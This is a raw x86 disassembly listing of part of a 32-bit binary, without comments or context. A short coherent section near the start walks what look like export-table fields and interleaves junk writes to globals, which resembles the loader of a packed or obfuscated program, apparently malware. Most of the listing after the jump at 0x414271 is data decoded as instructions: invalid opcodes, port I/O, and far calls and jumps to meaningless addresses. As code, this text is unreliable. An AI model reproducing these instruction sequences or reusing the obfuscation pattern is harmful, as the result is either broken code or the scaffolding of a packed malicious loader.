  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414258
  414283:	sub    al,BYTE PTR [ecx-0x28]
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0x6b70707e
  41428f:	test   eax,0xa7abb993
  414294:	mov    fs,WORD PTR [bp+di]
  414297:	inc    eax
  414298:	mov    dh,0x6d
  41429a:	add    ecx,DWORD PTR [esp+edx*2]
  41429d:	xchg   ebp,eax
  41429e:	push   0x60
  4142a0:	mov    WORD PTR [eax+0x46],es
  4142a3:	out    0xf5,eax
  4142a5:	sbb    al,0xef
  4142a7:	mov    esp,0x8cd2fdfc
  4142ac:	inc    edi
  4142ad:	jecxz  0x41426f
  4142af:	add    al,0xe6
  4142b1:	inc    esp
  4142b2:	in     eax,0x28
  4142b4:	push   ecx
  4142b5:	lods   al,BYTE PTR ds:[esi]
  4142b6:	push   0xdecd18b2
  4142bb:	sbb    eax,0xace46203
  4142c0:	add    bh,dl
  4142c2:	mov    ebx,0x7c7664cb
  4142c7:	call   0x29c6:0x85300c53
  4142ce:	cmp    eax,0x56351e57
  4142d3:	int3   
  4142d4:	es inc esi
  4142d6:	jbe    0x414274
  4142d8:	test   dh,dl
  4142da:	(bad)  
  4142db:	lods   eax,DWORD PTR ds:[esi]
  4142dc:	jae    0x41426c
  4142de:	sti    
  4142df:	lods   eax,DWORD PTR ds:[esi]
  4142e0:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e2:	in     al,0x45
  4142e4:	dec    edi
  4142e5:	rcr    DWORD PTR [ebx],cl
  4142e7:	inc    esp
  4142e8:	push   ebx
  4142e9:	push   eax
  4142ea:	popa   
  4142eb:	jno    0x4142d9
  4142ed:	mov    WORD PTR [edi+0x4e7c7054],?
  4142f3:	dec    eax
  4142f4:	test   eax,ecx
  4142f6:	jo     0x414293
  4142f8:	xchg   ch,cl
  4142fa:	lds    eax,FWORD PTR [ebp+0x46f565be]
  414300:	or     al,0xec
  414302:	lock xor ebp,DWORD PTR [edx-0x1f71768d]
  414309:	xor    al,0xfd
  41430c:	std    
  41430d:	lods   al,BYTE PTR ds:[esi]
  41430e:	aaa    
  41430f:	test   DWORD PTR [edx-0x416f892b],0xd7e8391
  414319:	leave  
  41431a:	fidiv  DWORD PTR [edi+eiz*2]
  41431d:	sti    
  41431e:	xchg   DWORD PTR [edi+0x5d],edx
  414321:	or     dl,0x3
  414324:	pop    esi
  414325:	arpl   WORD PTR [ecx-0x56],bp
  414328:	stc    
  414329:	mov    al,0xc0
  41432b:	ret    0x590c
  41432e:	fcmove st,st(7)
  414330:	and    cl,BYTE PTR [edx-0x3d]
  414333:	dec    eax
  414334:	mov    edx,0x625345e5
  414339:	cmp    al,0xec
  41433b:	aad    0x86
  41433d:	xor    al,0x14
  41433f:	sahf   
  414340:	sub    eax,0x3757dd92
  414345:	aad    0xbb
  414347:	and    BYTE PTR fs:[eax],ah
  41434a:	out    dx,al
  41434b:	jnp    0x414379
  41434d:	loope  0x4143ae
  41434f:	xor    cl,0xa9
  414352:	rol    BYTE PTR [esi+eax*2+0xe],cl
  414356:	push   0x6c4e67eb
  41435b:	std    
  41435c:	pushf  
  41435d:	inc    esp
  41435e:	nop
  41435f:	loopne 0x41434f
  414361:	sahf   
  414362:	push   cs
  414363:	ret    
  414364:	cmp    al,0x3d
  414366:	xchg   esp,eax
  414367:	sti    
  414368:	into   
  414369:	jp     0x414363
  41436b:	and    DWORD PTR [ebp-0x63],0x31
  41436f:	in     eax,dx
  414370:	add    al,0x10
  414372:	adc    ebx,DWORD PTR [edx-0x79]
  414375:	add    BYTE PTR [ecx-0x175dfde],dl
  41437b:	mov    edi,0xfd3cd6ea
  414380:	pop    esi
  414381:	pop    ebp
  414382:	dec    ecx
  414383:	out    0xa5,eax
  414385:	jl     0x4143f2
  414387:	aas    
  414388:	dec    edi
  414389:	stos   DWORD PTR es:[edi],eax
  41438a:	and    DWORD PTR ds:0x7987ccfb,esp
  414390:	pop    ebp
  414391:	sbb    DWORD PTR [ecx+0x2a75c00d],esi
  414397:	clc    
  414398:	xchg   ebp,eax
  414399:	jg     0x41432e
  41439b:	fs scas al,BYTE PTR es:[edi]
  41439d:	ror    BYTE PTR [edx+0x7f4e22eb],1
  4143a3:	mov    ds:0xf707f5f8,eax
  4143a8:	sbb    eax,0x915d98db
  4143ad:	mov    ecx,0xf1d39023
  4143b2:	shl    dh,cl
  4143b4:	enter  0x81e0,0xaa
  4143b8:	jle    0x41436b
  4143ba:	test   BYTE PTR [ecx-0x12],cl
  4143bd:	dec    ebx
  4143be:	adc    eax,0x3bfd6a05
  4143c3:	fs push ecx
  4143c5:	gs icebp 
  4143c7:	push   0xce7d0b1a
  4143cc:	jmp    0x414380
  4143ce:	cmp    ecx,DWORD PTR [ecx]
  4143d0:	icebp  
  4143d1:	out    0xc0,al
  4143d3:	int    0x76
  4143d5:	retf   0x9691
  4143d8:	xlat   BYTE PTR ds:[ebx]
  4143d9:	or     edx,0x977e63c2
  4143df:	ins    BYTE PTR es:[edi],dx
  4143e0:	pop    ecx
  4143e1:	push   ecx
  4143e2:	xchg   ebp,eax
  4143e3:	jae    0x4143b4
  4143e5:	pop    edx
  4143e6:	jne    0x41438f
  4143e8:	test   BYTE PTR [ebp+0x29b9ba53],bh
  4143ee:	pusha  
  4143ef:	add    ebx,DWORD PTR [edi]
  4143f1:	add    BYTE PTR [ecx+0x39],0xd6
  4143f5:	test   eax,0x644e1a66
  4143fa:	shl    DWORD PTR [ecx+0x3c],cl
  4143fd:	aam    0xbe
  4143ff:	cmp    eax,0x323b635
  414404:	cs repnz cld 
  414407:	add    dl,BYTE PTR [esi]
  414409:	pop    ss
  41440a:	cmp    eax,0x17f5fc2e
  41440f:	les    ebp,FWORD PTR [ecx-0x19f123a9]
  414415:	push   edi
  414416:	cmp    eax,0xdb84ffc1
  41441b:	pop    es
  41441c:	pop    ebx
  41441d:	fwait
  41441e:	ja     0x4143f9
  414420:	mov    eax,0xde34c499
  414425:	pop    ebx
  414426:	fsubr  QWORD PTR [esi+0x53]
  414429:	or     eax,DWORD PTR [ecx+edx*2]
  41442c:	imul   edi,DWORD PTR [esp+ecx*4-0x35],0x57329694
  414434:	mov    DWORD PTR [eax+0x73],ecx
  414437:	std    
  414438:	lds    esp,FWORD PTR [ebx]
  41443a:	xchg   esi,eax
  41443b:	int    0x9
  41443d:	push   esp
  41443e:	mov    al,ds:0xc02ba776
  414443:	xchg   ah,dh
  414445:	fs fs enter 0x9a8e,0xf5
  41444b:	jnp    0x414473
  41444d:	cwde   
  41444e:	sub    dl,dl
  414450:	les    eax,FWORD PTR [ebx-0x2e]
  414453:	mov    ds:0x67d019e,eax
  414458:	push   esp
  414459:	mov    edi,DWORD PTR [edx+0x6f5158b7]
  41445f:	mov    ds:0x17483ca0,eax
  414464:	neg    al
  414466:	jmp    0xbcc96747
  41446b:	inc    ecx
  41446c:	push   esp
  41446d:	xchg   ecx,eax
  41446e:	jo     0x414482
  414470:	add    ah,BYTE PTR [eax+0x25]
  414473:	push   ebp
  414474:	ss pop esi
  414476:	add    eax,0xeecbba3d
  41447b:	push   ebx
  41447c:	inc    edx
  41447d:	cmp    al,0x5e
  41447f:	loope  0x414463
  414481:	cs ins BYTE PTR es:[edi],dx
  414483:	and    BYTE PTR [edx],bh
  414485:	mov    edi,DWORD PTR [ebp+0x6d3b9e80]
  41448b:	dec    ebx
  41448c:	cmc    
  41448d:	dec    esi
  41448e:	adc    BYTE PTR [ebp+edi*2-0x6c39b009],dl
  414495:	jp     0x414435
  414497:	pushf  
  414498:	fwait
  414499:	push   esi
  41449a:	and    ebx,esi
  41449c:	jle    0x414490
  41449e:	imul   ecx,esp,0x7e
  4144a1:	les    edx,FWORD PTR [edi]
  4144a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a4:	(bad)  
  4144a6:	mov    WORD PTR [edi-0x2354ef33],?
  4144ac:	dec    esi
  4144ad:	mov    bh,0x72
  4144af:	adc    al,0x96
  4144b1:	lods   eax,DWORD PTR ds:[esi]
  4144b2:	cmp    edi,edx
  4144b4:	fistp  DWORD PTR ds:0x1972c176
  4144ba:	jns    0x4144cd
  4144bc:	jnp    0x414470
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	inc    edi
  4144c0:	(bad)
  4144c3:	pop    ss
  4144c4:	push   es
  4144c5:	cmp    al,0x7a
  4144c7:	or     al,0xae
  4144c9:	fild   QWORD PTR [edi]
  4144cb:	test   BYTE PTR [edi],cl
  4144cd:	(bad)  
  4144ce:	ins    DWORD PTR es:[edi],dx
  4144cf:	(bad)  
  4144d0:	ror    BYTE PTR [eax+0x682877cf],1
  4144d6:	jge    0x4144bd
  4144d8:	push   ss
  4144d9:	push   ds
  4144da:	sub    DWORD PTR [eax+eax*2],eax
  4144dd:	or     eax,0x8269587d
  4144e2:	mov    ebp,0xa0a99ca7
  4144e7:	jg     0x414520
  4144e9:	and    dh,BYTE PTR [ecx]
  4144eb:	pop    ds
  4144ec:	fcmovnbe st,st(2)
  4144ee:	and    eax,DWORD PTR [esi-0x181500d]
  4144f4:	mov    dh,BYTE PTR [edx]
  4144f6:	cdq    
  4144f7:	sbb    ebp,DWORD PTR [ebx-0x1c]
  4144fa:	sub    al,0xe9
  4144fc:	sbb    edi,DWORD PTR [edi]
  4144fe:	inc    ebx
  4144ff:	dec    edx
  414500:	xchg   edi,eax
  414501:	jmp    0xeab91e4c
  414506:	stc    
  414507:	mov    dl,0x5e
  414509:	adc    BYTE PTR [ebx+0x59a4460f],0x5c
  414510:	stos   DWORD PTR es:[edi],eax
  414511:	mov    DWORD PTR [ebp-0x55],0x4ebd56b4
  414518:	mov    esi,0xb2bff3ee
  41451d:	jp     0x41455c
  41451f:	add    DWORD PTR [ecx-0x662647a1],ebx
  414525:	inc    edi
  414526:	dec    eax
  414527:	and    DWORD PTR [ebx-0x4f4d4d06],eax
  41452d:	inc    DWORD PTR [ebp+0x72]
  414530:	popa   
  414531:	pop    edi
  414532:	cmp    BYTE PTR [eax-0x13e54437],ch
  414538:	add    eax,0xfbbf423
  41453d:	call   0x24b506f5
  414542:	test   DWORD PTR [edi+0x4a1c4da1],eax
  414548:	rcr    DWORD PTR [ecx],0xb3
  41454b:	or     bl,ch
  41454d:	push   ebx
  41454e:	jmp    0x18c6:0x9346646b
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xede3beb4
  414576:	mov    ah,0x17
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x41453f
  414581:	sti    
  414582:	mov    ecx,0x2a58e009
  414587:	addr16 retf 0x2828
  41458b:	cmp    eax,0x5370eea5
  414590:	xchg   esi,eax
  414591:	popf   
  414592:	inc    esp
  414593:	retf   
  414594:	mov    al,ds:0xa2229314
  414599:	gs je  0x41454c
  41459c:	sbb    al,0x2a
  41459e:	jp     0x4145ca
  4145a0:	jno    0x414563
  4145a2:	push   ss
  4145a3:	cdq    
  4145a4:	outs   dx,BYTE PTR ds:[esi]
  4145a5:	add    esi,edx
  4145a7:	(bad)  [edi]
  4145a9:	lock in al,0x2d
  4145ac:	mov    ecx,0xe5490621
  4145b1:	imul   eax,DWORD PTR [esi],0x354d5c20
  4145b7:	cli    
  4145b8:	xor    cl,BYTE PTR [ebp+0x232502e7]
  4145be:	xchg   DWORD PTR ds:0x708e2aad,ebp
  4145c4:	rol    DWORD PTR [ebp-0x3d04478],0x13
  4145cb:	neg    DWORD PTR [eax]
  4145cd:	push   ebx
  4145ce:	psubsb mm7,mm7
  4145d1:	push   0xd27b5d3d
  4145d6:	leave  
  4145d7:	add    DWORD PTR [ecx-0x1ec54ad6],ebx
  4145dd:	popf   
  4145de:	pop    esp
  4145df:	retf   0x9e02
  4145e2:	jle    0x41461e
  4145e4:	xchg   ebp,eax
  4145e5:	outs   dx,BYTE PTR ds:[esi]
  4145e6:	lods   al,BYTE PTR ds:[esi]
  4145e7:	jne    0x414650
  4145e9:	jecxz  0x414613
  4145eb:	jp     0x41456e
  4145ed:	cmp    DWORD PTR [edx-0x63ceddc5],ebp
  4145f3:	push   ds
  4145f4:	test   DWORD PTR [eax+ebx*2],esi
  4145f7:	es push edx
  4145f9:	xchg   esi,eax
  4145fa:	jb     0x414662
  4145fc:	jo     0x4145d7
  4145fe:	mov    ebx,0x897a43cc
  414603:	mov    edx,ss
  414605:	mov    ebx,edi
  414607:	adc    al,0x2a
  414609:	ret    0x5164
  41460c:	push   ecx
  41460d:	mov    DWORD PTR [eax],esi
  41460f:	repz fcom st(4)
  414612:	dec    ecx
  414613:	(bad)  
  414614:	clc    
  414615:	test   eax,0x4b3d0201
  41461a:	sub    BYTE PTR [ebp-0x34],0xf5
  41461e:	xor    al,BYTE PTR [ebx]
  414620:	daa    
  414621:	cli    
  414622:	imul   DWORD PTR [edx]
  414624:	add    al,0x25
  414626:	inc    ebp
  414627:	ret    0xcbed
  41462a:	mov    ah,0x56
  41462c:	mov    WORD PTR [edi-0x8],ds
  41462f:	jne    0x414694
  414631:	and    al,0x1f
  414633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414634:	xchg   ah,dl
  414636:	push   0xce972814
  41463b:	dec    ebx
  41463c:	inc    esp
  41463d:	fst    QWORD PTR ds:0xbacbcf40
  414643:	ror    al,cl
  414645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414646:	xor    eax,0xad4d8bae
  41464b:	int    0x68
  41464d:	shl    BYTE PTR [ebp+edi*1-0x2aec4cc9],cl
  414654:	push   ebx
  414655:	mov    ds:0xc4f810c3,al
  41465a:	pop    edi
  41465b:	fistp  DWORD PTR ds:[eax+0x3e9482ed]
  414662:	mov    edx,DWORD PTR [esi+ebx*4-0x16]
  414666:	js     0x41469c
  414668:	dec    esp
  414669:	mov    DWORD PTR [esi+0x5c],0x5dec505
  414670:	jns    0x4146d6
  414672:	ins    BYTE PTR es:[edi],dx
  414673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414674:	xchg   edx,eax
  414675:	sbb    esp,esp
  414677:	push   edx
  414678:	push   esp
  414679:	jmp    0x414637
  41467b:	pop    eax
  41467c:	nop
  41467d:	rcl    DWORD PTR [ecx-0xdd56158],0x9c
  414684:	mov    dl,0x50
  414686:	xor    eax,0x313dc29a
  41468b:	or     BYTE PTR [esi],dh
  41468d:	shr    ebx,0xee
  414690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414691:	mov    dh,0x86
  414693:	pushf  
  414694:	xchg   esp,eax
  414695:	dec    ebp
  414696:	dec    edx
  414697:	(bad)  
  414698:	push   0x6b
  41469a:	pop    ebp
  41469b:	jge    0x4146ef
  41469d:	or     edi,edx
  41469f:	rcl    BYTE PTR [ecx+0x6042a662],cl
  4146a5:	and    BYTE PTR [edx],bh
  4146a7:	push   edi
  4146a8:	cmp    al,0x4d
  4146aa:	shl    BYTE PTR [ecx+0x7e768163],cl
  4146b0:	arpl   WORD PTR [edx],sp
  4146b2:	mov    ebp,0x78d00540
  4146b7:	imul   ebx,ebp,0x838c7cf0
  4146bd:	adc    BYTE PTR [esi-0x2209c63],dh
  4146c3:	push   esp
  4146c4:	xor    bl,BYTE PTR [ebp-0x527420f1]
  4146ca:	mov    ebx,0xaaa996e2
  4146cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d0:	and    DWORD PTR [eax+ebp*4-0x3b],ebx
  4146d4:	add    al,0x3a
  4146d6:	pusha  
  4146d7:	aad    0xdd
  4146d9:	sbb    BYTE PTR [ebx],bl
  4146db:	sbb    eax,0xf735ae1a
  4146e0:	ins    BYTE PTR es:[edi],dx
  4146e1:	mov    ds:0xc29d6a61,eax
  4146e6:	sub    eax,0xd8beb2ad
  4146eb:	dec    ecx
  4146ec:	push   ds
  4146ed:	or     eax,0xc24a917a
  4146f2:	mov    eax,0x3c1faa61
  4146f7:	inc    esp
  4146f8:	sub    eax,0x4ba36752
  4146fd:	test   al,0x19
  4146ff:	out    dx,al
  414700:	shl    BYTE PTR [ecx-0x6bfdbca9],1
  414706:	push   eax
  414707:	xchg   DWORD PTR [eax-0x3],edx
  41470a:	add    bl,ch
  41470c:	mov    ah,0x3e
  41470e:	dec    eax
  41470f:	push   ss
  414710:	xchg   edx,eax
  414711:	mov    eax,ds:0xa7e27c07
  414716:	arpl   WORD PTR [esi+0x2c685a95],si
  41471c:	or     al,ah
  41471e:	call   0xda8a4566
  414723:	shl    edx,0xe5
  414726:	mov    bh,0xeb
  414728:	pop    ss
  414729:	cdq    
  41472a:	pop    es
  41472b:	xchg   DWORD PTR [ecx+0x2186742f],ebx
  414731:	dec    esp
  414732:	jp     0x414785
  414734:	addr16 test al,0x4b
  414737:	mov    al,0x14
  414739:	sbb    al,0xcb
  41473b:	jae    0x4146fa
  41473d:	in     eax,dx
  41473e:	fxch   st(5)
  414740:	mov    WORD PTR [ecx-0x6a49726a],?
  414746:	lods   eax,DWORD PTR ds:[esi]
  414747:	inc    esi
  414748:	cmc    
  414749:	pop    ds
  41474a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41474b:	mov    esi,0x856a2c38
  414750:	repz push ss
  414752:	xor    DWORD PTR [esi-0x2ea06536],ebp
  414758:	xchg   esp,eax
  414759:	es enter 0x73e3,0xdb
  41475e:	mov    edi,0x54817c6d
  414763:	xor    DWORD PTR [edi-0x6502b124],eax
  414769:	and    eax,0xdf418bff
  41476e:	(bad)  
  41476f:	ror    DWORD PTR [esp+eiz*2],1
  414772:	fsubr  st,st(0)
  414774:	call   0x2c126543
  414779:	mov    ebx,DWORD PTR [edi+0x1407f1fd]
  41477f:	cmp    al,0x73
  414781:	scas   eax,DWORD PTR es:[edi]
  414782:	cmp    al,0x10
  414784:	jl     0x414758
  414786:	call   0x98d9:0xfd482e1f
  41478d:	dec    ebp
  41478e:	and    bh,BYTE PTR [esi]
  414790:	mov    es,ebp
  414792:	and    dh,ah
  414794:	xlat   BYTE PTR ds:[ebx]
  414795:	inc    edx
  414796:	push   esp
  414797:	into   
  414798:	sub    DWORD PTR [edi],eax
  41479a:	dec    esi
  41479b:	xchg   edx,eax
  41479c:	test   BYTE PTR [ecx-0x37],cl
  41479f:	mov    ds:0x7657a380,eax
  4147a4:	add    DWORD PTR [ecx+0x3c],0xd71a6b53
  4147ab:	arpl   WORD PTR [edi],ax
  4147ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ae:	and    BYTE PTR gs:[edx+0x5b2e4fae],0xdb
  4147b6:	push   0x6a
  4147b8:	xlat   BYTE PTR ds:[ebx]
  4147b9:	push   cs
  4147ba:	inc    ebp
  4147bb:	push   edi
  4147bc:	add    DWORD PTR [ebp-0xdf369fd],0xbff35fbf
  4147c6:	(bad)  
  4147c7:	lock sar DWORD PTR [edi-0x78089934],0xea
  4147cf:	jle    0x414771
  4147d1:	pop    esi
  4147d2:	jl     0x4147b3
  4147d4:	fstp   QWORD PTR [eax-0x4bef583d]
  4147da:	test   al,0x55
  4147dc:	push   0x46
  4147de:	ret    0xb0fe
  4147e1:	mov    DWORD PTR [edx],ebp
  4147e3:	loopne 0x4147cf
  4147e5:	jecxz  0x4147be
  4147e7:	cmp    dh,BYTE PTR [esi-0x6]
  4147ea:	lea    edi,[edx+0x5b6a2f19]
  4147f0:	mov    edi,0xa8734be6
  4147f5:	ins    DWORD PTR es:[edi],dx
  4147f6:	adc    al,0x49
  4147f8:	push   edi
  4147f9:	stc    
  4147fa:	jl     0x41478b
  4147fc:	dec    edi
  4147fd:	sar    BYTE PTR [esi+0x2a7f48d7],0x53
  414804:	fiadd  WORD PTR [eax+ecx*4]
  414807:	lods   al,BYTE PTR ds:[esi]
  414809:	outs   dx,DWORD PTR ds:[esi]
  41480a:	fmul   DWORD PTR [ebp+ebx*4+0x2003e051]
  414811:	ja     0x41484a
  414813:	dec    edx
  414814:	xor    BYTE PTR [edi],bh
  414816:	arpl   WORD PTR [edi-0x5f92229c],bp
  41481c:	mov    cl,0x37
  41481e:	icebp  
  41481f:	mov    esi,0x5136e74f
  414824:	add    al,0xff
  414826:	mov    ebx,0x33c3321b
  41482b:	or     BYTE PTR [edi+0x2d],bh
  41482e:	dec    ebp
  41482f:	adc    al,0xec
  414831:	sbb    DWORD PTR [edi+eiz*1-0x64],eax
  414835:	cmp    eax,0x553f383d
  41483a:	mov    esi,0x3c37514e
  41483f:	ficomp WORD PTR [edx+eax*1+0x6ad64a39]
  414846:	push   0x35f84d8b
  41484b:	push   ebp
  41484c:	or     BYTE PTR [ecx+0x7],dl
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414870
  414861:	cld    
  414862:	jg     0x4147f2
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x41483a
  41486d:	push   ds
  41486e:	jmp    0xde7a5719
  414873:	dec    edi
  414874:	fdivr  QWORD PTR [ebx+esi*2]
  414877:	inc    ebp
  414878:	gs push esi
  41487a:	and    BYTE PTR [edx-0x7c],al
  41487d:	bound  edi,QWORD PTR [edi+ebx*2]
  414880:	dec    ebx
  414881:	inc    esi
  414882:	loopne 0x414851
  414884:	test   al,0x13
  414886:	xchg   edi,eax
  414887:	fstp   DWORD PTR [ebp+0x78]
  41488a:	dec    ebp
  41488b:	call   0xaabb:0xaf0697db
  414892:	in     eax,0x2f
  414894:	adc    ecx,eax
  414896:	push   eax
  414897:	xor    BYTE PTR [edx],dh
  414899:	xchg   ebp,eax
  41489a:	mov    edx,0xd6735cf3
  41489f:	cmp    al,0x14
  4148a1:	pop    ebp
  4148a2:	lds    ebp,FWORD PTR [edi]
  4148a4:	stos   BYTE PTR es:[edi],al
  4148a5:	lahf   
  4148a6:	pop    edx
  4148a7:	dec    esp
  4148a8:	call   0xc266:0x73156fb0
  4148af:	dec    eax
  4148b0:	jecxz  0x414904
  4148b2:	jge    0x414845
  4148b4:	mov    bl,0xf1
  4148b6:	sub    cl,BYTE PTR [ebx]
  4148b8:	popf   
  4148b9:	sbb    BYTE PTR [ebx+0x2e],cl
  4148bc:	dec    edx
  4148bd:	push   0xfffffff5
  4148bf:	cmp    al,0x75
  4148c1:	ffreep st(5)
  4148c3:	pusha  
  4148c4:	add    DWORD PTR [edi],esp
  4148c6:	push   0x7107ef9e
  4148cb:	cli    
  4148cc:	mov    ch,0xf
  4148ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148cf:	mov    eax,ds:0x4d1b4e4e
  4148d4:	gs mov ebp,0x647c1046
  4148da:	push   edx
  4148db:	add    DWORD PTR [ecx+0x4538cbbf],esi
  4148e1:	xor    ebp,DWORD PTR [ebx+0x4fc9cd6b]
  4148e7:	and    dh,BYTE PTR [ebx]
  4148e9:	lds    esp,FWORD PTR [esi-0x2a]
  4148ec:	sub    cl,bl
  4148ee:	mov    ds:0xb08b97f7,al
  4148f3:	fsub   QWORD PTR [ecx]
  4148f5:	stos   BYTE PTR es:[edi],al
  4148f6:	outs   dx,DWORD PTR ds:[esi]
  4148f7:	mov    dh,0xa4
  4148f9:	(bad)  
  4148fa:	push   ss
  4148fb:	in     al,0x4b
  4148fd:	retf   0x9048
  414900:	xchg   ebp,eax
  414901:	lds    ebx,FWORD PTR [eax-0x3b]
  414904:	loope  0x4148ab
  414906:	les    esi,FWORD PTR [ebx+eiz*4-0x4a7a8d19]
  41490d:	xchg   ebx,eax
  41490e:	and    dh,BYTE PTR [ebp+ebx*8+0x418bb57b]
  414915:	cwde   
  414916:	rcl    al,1
  414918:	ret    
  414919:	enter  0xf206,0xb0
  41491d:	push   es
  41491e:	test   bh,ah
  414920:	sub    edx,esp
  414922:	mov    ecx,0xbf0d108d
  414927:	inc    ebp
  414929:	scas   al,BYTE PTR es:[edi]
  41492a:	mov    edi,0x3f220d37
  41492f:	push   0xfffffffc
  414931:	outs   dx,DWORD PTR ds:[esi]
  414932:	sbb    eax,0x12b466b4
  414937:	push   ebp
  414938:	lds    ebp,FWORD PTR ds:0xa07ce50d
  41493e:	add    bh,ch
  414940:	aas    
  414941:	ret    
  414942:	sub    ebp,DWORD PTR [ebp-0x3cff634c]
  414948:	dec    ebx
  414949:	push   edx
  41494a:	mov    esi,0xe637922b
  41494f:	mov    ebp,0x57b992a0
  414954:	xor    BYTE PTR [edi+0x8],0x6
  414958:	aaa    
  414959:	inc    ebx
  41495a:	int3   
  41495b:	fisub  WORD PTR [eax+0x2e]
  41495e:	cmp    al,0x31
  414960:	cli    
  414961:	cmp    esi,eax
  414963:	or     BYTE PTR [edx-0x7],0x3a
  414967:	pop    eax
  414968:	inc    ebp
  414969:	(bad)  
  41496a:	montmul (bad)
  41496b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41496c:	add    eax,0xe47dfb7d
  414971:	es shl ebp,cl
  414974:	xchg   ebx,eax
  414975:	pop    ds
  414976:	jno    0x414900
  414978:	fwait
  414979:	mov    eax,ds:0x5a2d5672
  41497e:	ss pop esi
  414980:	dec    edx
  414981:	mov    bl,0xc1
  414983:	dec    ebp
  414984:	cmp    al,0x72
  414986:	in     al,0xb1
  414988:	and    esp,DWORD PTR [ebx+0x22]
  41498b:	mov    ah,0x83
  41498d:	pop    ss
  41498e:	xor    esi,ebp
  414990:	pop    ebx
  414991:	in     al,0xf8
  414993:	adc    eax,0x9c13ae43
  414998:	in     eax,0xff
  41499a:	imul   esi,DWORD PTR [edi-0x4bd38c86],0x76
  4149a1:	mov    eax,gs
  4149a3:	lods   al,BYTE PTR ds:[esi]
  4149a4:	or     DWORD PTR [eax+0x77ead532],ebp
  4149aa:	mov    BYTE PTR [ebx],ah
  4149ac:	ins    BYTE PTR es:[edi],dx
  4149ad:	mov    ch,0xec
  4149af:	adc    eax,DWORD PTR [esi-0x352e4cf5]
  4149b5:	jp     0x41495f
  4149b7:	aad    0xf8
  4149b9:	and    esi,DWORD PTR [ecx-0x58ffc1a8]
  4149bf:	test   eax,0x6df4fa7b
  4149c4:	jmp    0x567f055
  4149c9:	shl    ebx,0x50
  4149cc:	in     al,dx
  4149cd:	in     al,dx
  4149ce:	call   0x53b3:0xb5b7dac2
  4149d5:	jnp    0x414991
  4149d7:	icebp  
  4149d8:	sub    eax,0x449a38
  4149dd:	push   0xffffffac
  4149df:	push   esp
  4149e0:	xchg   ecx,eax
  4149e1:	dec    edi
  4149e2:	das    
  4149e3:	pop    ds
  4149e4:	jmp    DWORD PTR [ebx]
  4149e6:	fisttp WORD PTR [esi+0x47]
  4149e9:	ja     0x4149c1
  4149eb:	inc    ebp
  4149ec:	push   ebx
  4149ed:	scas   eax,DWORD PTR es:[edi]
  4149ee:	retf   
  4149ef:	push   es
  4149f0:	call   0x3dc836f0
  4149f5:	verr   WORD PTR [edi]
  4149f8:	adc    al,0x60
  4149fa:	jle    0x414a78
  4149fc:	sbb    DWORD PTR [ebx+0x79],ebp
